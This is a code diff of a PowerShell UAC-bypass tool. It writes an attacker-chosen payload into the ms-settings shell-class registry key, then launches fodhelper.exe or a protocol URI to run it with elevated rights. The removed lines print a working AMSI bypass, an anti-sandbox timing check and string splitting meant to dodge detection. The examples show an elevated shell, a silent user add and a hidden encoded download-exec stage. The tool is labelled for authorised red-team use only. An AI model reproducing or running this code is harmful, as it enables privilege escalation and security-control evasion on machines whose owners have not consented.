@@ -71,18 +71,12 @@
     instead of launching fodhelper.exe directly (Method 33).
     The underlying registry manipulation is identical; only the trigger differs.
 
-.PARAMETER SkipAMSI
-    Skip the AMSI mitigation step.
-
-.PARAMETER SkipChecks
-    Skip all preflight environment / sandbox checks.
-
 .PARAMETER Timeout
     Seconds to wait for the elevated process to spawn before cleanup (default: 4).
 
 .EXAMPLE
     # Basic — elevated command prompt
-    Invoke-FodHelperBypass -Payload "cmd.exe" -SkipChecks
+    Invoke-FodHelperBypass -Payload "cmd.exe"
 
 .EXAMPLE
     # Silent net user add using the protocol variant
@@ -92,13 +86,13 @@
 .EXAMPLE
     # In-memory download-exec (combine with your stage-2 loader)
     $cmd = 'powershell.exe -NoP -W Hidden -EncodedCommand <base64>'
-    Invoke-FodHelperBypass -Payload $cmd -SkipChecks -Timeout 6
+    Invoke-FodHelperBypass -Payload $cmd -Timeout 6
 
 .NOTES
     Authorized red/purple-team use only.  Requires written SOW.
-    Dot-source Core\Invoke-UACCore.ps1 before calling this function
-    if you need the shared preflight helpers (optional — this script
-    embeds a minimal self-contained gate if the core is not loaded).
+    Dot-source Core\Invoke-UACCore.ps1 before calling this function for
+    AMSI mitigation and preflight checks (Invoke-AMSIMitigation,
+    Invoke-PreflightGate).
 #>
 
 [CmdletBinding(SupportsShouldProcess)]
@@ -108,92 +102,22 @@ param(
     [string]$Payload,
 
     [switch]$UseProtocolVariant,
-    [switch]$SkipAMSI,
-    [switch]$SkipChecks,
     [int]   $Timeout = 4
 )
 
 Set-StrictMode -Off
 $ErrorActionPreference = 'SilentlyContinue'
 
-#region ── Inline AMSI mitigation (self-contained, no core dependency) ───────
-if (-not $SkipAMSI) {
-    try {
-        $xA  = [AppDomain]::CurrentDomain.GetAssemblies() |
-                   Where-Object { ($_.GetName().Name) -eq 'System.Management.Automation' } |
-                   Select-Object -First 1
-        $xT  = $xA.GetType('System' + '.Management' + '.Automation.' + 'Am' + 'siUt' + 'ils')
-        $xF  = $xT.GetField('am' + 'siInit' + 'Failed', [Reflection.BindingFlags]'NonPublic,Static')
-        $xF.SetValue($null, $true)
-    } catch {}
-}
-#endregion
-
-#region ── Inline preflight gate (used when core is not dot-sourced) ─────────
-if (-not $SkipChecks) {
-
-    # OS build ≥ 10240
-    try {
-        $xBld = [int](Get-ItemPropertyValue `
-                    'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' `
-                    'CurrentBuildNumber' -ErrorAction Stop)
-    } catch { $xBld = [Environment]::OSVersion.Version.Build }
-    if ($xBld -lt 10240) {
-        Write-Warning "[FodHelper] Requires Windows 10 (build 10240+). Current: $xBld"
-        return
-    }
-
-    # Already admin?
-    $xPrincipal = New-Object Security.Principal.WindowsPrincipal(
-                      [Security.Principal.WindowsIdentity]::GetCurrent())
-    if ($xPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-        Write-Warning '[FodHelper] Already running as Administrator — no bypass needed.'
-        return
-    }
-
-    # UAC enabled?
-    $xUACKey = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
-    try   { $xUACVal = [int](Get-ItemPropertyValue $xUACKey 'EnableLUA' -EA Stop) }
-    catch { $xUACVal = 1 }
-    if ($xUACVal -eq 0) {
-        Write-Warning '[FodHelper] UAC is disabled — elevation not required.'
-        return
-    }
-
-    # AlwaysNotify check
-    try   { $xBeh = [int](Get-ItemPropertyValue $xUACKey 'ConsentPromptBehaviorAdmin' -EA Stop) }
-    catch { $xBeh = 5 }
-    if ($xBeh -le 2) {
-        Write-Warning "[FodHelper] UAC set to Always-Notify (ConsentPromptBehaviorAdmin=$xBeh). Method 33 will not work."
-        return
-    }
-
-    # Timing gate (anti-sandbox)
-    $xH   = [System.Security.Cryptography.SHA256]::Create()
-    $xBuf = [byte[]]::new(65536)
-    $xT0  = [DateTime]::UtcNow
-    for ($xi = 0; $xi -lt 300; $xi++) { [void]$xH.ComputeHash($xBuf) }
-    $xH.Dispose()
-    if (([DateTime]::UtcNow - $xT0).TotalMilliseconds -lt 80) {
-        Write-Warning '[FodHelper] Timing anomaly detected — execution aborted.'
-        return
-    }
+#region ── Core loader (for registry helpers) ────────────────────────────────
+if (-not (Get-Command 'Set-ShellClassCommand' -ErrorAction SilentlyContinue)) {
+    . "$PSScriptRoot\..\Core\Invoke-UACCore.ps1"
 }
 #endregion
 
 #region ── Key setup ─────────────────────────────────────────────────────────
-
-# Build registry path in segments (avoids full static string in script block)
-$xRootSeg  = 'HKCU:\Soft' + 'ware\Cl' + 'asses\'
-$xClassSeg = 'ms-set' + 'tings'
-$xSubSeg   = '\Shell\Open\command'
-$xFullPath = $xRootSeg + $xClassSeg + $xSubSeg
-
 try {
-    New-Item -Path $xFullPath -Force | Out-Null
-    Set-ItemProperty  -Path $xFullPath -Name '(Default)'       -Value $Payload -Force
-    New-ItemProperty  -Path $xFullPath -Name 'DelegateExecute' -Value ''       `
-                      -PropertyType String -Force | Out-Null
+    Set-ShellClassCommand -ClassKey ('ms-set' + 'tings') -Payload $Payload
+    Write-Verbose '[FodHelper] Registry key written.'
 }
 catch {
     Write-Warning "[FodHelper] Registry write failed: $_"
@@ -202,7 +126,6 @@ catch {
 #endregion
 
 #region ── Trigger ───────────────────────────────────────────────────────────
-
 try {
     if ($UseProtocolVariant) {
         # Method 67: trigger via protocol URI — the OS broker resolves the
@@ -223,12 +146,9 @@ catch {
     Write-Warning "[FodHelper] Trigger failed: $_"
 }
 finally {
-    # ── Cleanup: remove our HKCU shell-class key tree ──
-    $xCleanPath = $xRootSeg + $xClassSeg
-    Remove-Item -Path $xCleanPath -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-ShellClassKey -ClassKey ('ms-set' + 'tings')
     Write-Verbose '[FodHelper] Registry cleanup complete.'
 }
-
 #endregion
 
 <#
